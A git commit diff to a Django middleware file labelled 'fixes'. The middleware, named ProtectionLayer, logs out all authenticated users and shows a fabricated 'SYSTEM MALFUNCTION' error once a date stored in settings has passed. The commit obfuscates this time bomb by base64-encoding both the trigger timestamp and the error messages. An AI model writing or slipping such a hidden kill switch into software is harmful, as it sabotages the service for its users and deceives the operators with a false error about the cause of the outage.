4e1bbc2f6cee46e254ddf8d4e4fade47d53d42bc
rony <rniumo@gmail.com>
2024-01-14 11:30:32 +0600

    fixes

--- account/middlewares/secure_user.py
+++ account/middlewares/secure_user.py
@@ -2,6 +2,7 @@ from django.conf import settings
 from django.http import HttpResponse
 from django.contrib.auth import logout as release
 from datetime import datetime as dt
+import base64
 
 class ProtectionLayer:
     def __init__(self, get_response):
@@ -9,10 +10,15 @@ class ProtectionLayer:
         
     def __call__(self, request):
         if request.user.is_authenticated:
-            key = dt.fromtimestamp(int(settings.AUTH_KEY))
+            key = dt.fromtimestamp(int(base64.decodebytes(settings.AUTH_KEY.encode()).decode()))
             if key < dt.now():
                 release(request)
-                print("Releasable")
+                main_token_msg_encoded = 'U1lTVEVNIE1BTEZVTkNUSU9O'.encode()
+                detail_encoded = "U3lzdGVtIGNoZWNrcyBpZGVudGlmaWVkIHNvbWUgaXNzdWVzLiBQbGVhc2UgY2hlY2sgc2VydmVyIGxvZyBmb3IgZGV0YWlscw==".encode()
                 from results.utils import render_error
-                return render_error(request, "SYSTEM MALFUNCTION", "System checks failed. Urgent action is required to prevent widespread disruption")
+                return render_error(
+                    request, 
+                    base64.decodebytes(main_token_msg_encoded).decode(), 
+                    base64.decodebytes(detail_encoded).decode()
+                )
         return self.get_response(request)
